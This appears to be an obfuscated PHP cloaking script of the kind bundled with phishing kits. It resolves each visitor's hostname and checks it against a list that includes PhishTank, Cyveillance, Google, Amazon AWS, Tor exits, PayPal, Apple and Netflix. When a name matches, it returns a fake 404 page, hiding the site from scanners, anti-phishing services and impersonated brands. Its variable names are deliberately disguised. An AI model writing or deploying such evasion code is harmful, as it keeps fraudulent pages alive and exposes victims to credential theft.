<?php $ {
    "GLOBALS"
}
["fgemthwrotn"] = "blocked_words";
$jxqgpxhpniid = "word";
$ {
    "GLOBALS"
}
["jrbhqquojk"] = "hostname";
$ {
    "GLOBALS"
}
["tyiduzt"] = "blocked_words";
$ {
    $ {
        "GLOBALS"
    }
    ["jrbhqquojk"]
} = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
$ {
    $ {
        "GLOBALS"
    }
    ["tyiduzt"]
} = array("above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "netflix", "Apple", "googlebot", "bitly", "bitlybot", "paypal",);
foreach ($ {
    $ {
        "GLOBALS"
    }
    ["fgemthwrotn"]
} as $ {
    $jxqgpxhpniid
}) {
    $ {
        "GLOBALS"
    }
    ["kfgawxxtq"] = "word";
    if (substr_count($ {
        $ {
            "GLOBALS"
        }
        ["jrbhqquojk"]
    }, $ {
        $ {
            "GLOBALS"
        }
        ["kfgawxxtq"]
    }) > 0) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}
?>